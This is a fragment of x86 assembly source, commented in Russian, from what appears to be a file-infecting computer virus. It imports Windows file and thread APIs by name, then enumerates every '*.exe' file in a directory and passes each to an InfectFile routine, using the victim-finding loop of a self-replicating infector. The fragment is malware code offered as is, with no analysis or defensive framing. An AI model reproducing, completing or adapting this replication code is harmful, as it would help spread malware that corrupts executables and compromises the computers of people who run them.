InitApi proc
        Call    ApiInit

	xchg	eax,edx
	lea	esi,[nf1][ebp]
	lea	edi,[CreateFile][ebp]		; Начинаем импортировать
	mov	ecx,imnum			; нужные нам функции
Import:	push	ecx
	push	edi
	mov	edi,esi
	mov	al,0
f0:	scasb
	jnz	f0
	mov	edx,edi				; Расчитаем длину
	sub	edx,esi
	dec	edx
	dec	edx
	xchg	edi,esi
	push	esi
	Call	ImportApi			; Импортируем
	pop	esi
	pop	edi
	or	eax,eax
	pop	ecx
	jz	jquit
	stosd
	loop	Import				; Продолжаем
        ret
InitApi endp

nf1:	db	'CreateFileA',0			; Импорт
	db	'ReadFile',0
	db	'WriteFile',0
	db	'CloseHandle',0
	db	'FindFirstFileA',0
	db	'FindNextFileA',0
	db	'FindClose',0
	db	'SetFilePointer',0
	db	'CreateThread',0
	db	'ExitThread',0

fmask	db	'*.exe',0

InfectDir	proc
	mov	ebp,[esp][4]

	lea	edx,[fmask][ebp]
	lea	ecx,[VirFindData][ebp]
	Call	[FindFirstFile][ebp],edx,ecx	; Ищем файл
	inc	eax
	jz	AllFounded			; Нету больше...
	dec	eax
	mov	[fhandle][ebp],eax
ifile:	lea	edx,[cFileName][ebp]
        Call    InfectFile
	mov	edx,[fhandle][ebp]
	lea	ecx,[VirFindData][ebp]
	Call	[FindNextFile][ebp],edx,ecx		; Следующий файл
	or	eax,eax
	jnz	ifile
	mov	edx,[fhandle][ebp]
	Call	[FindClose][ebp],edx
AllFounded:
	Call	[ExitThread][ebp],0
	ret					; Needed !!
InfectDir	endp

fhandle         dd  0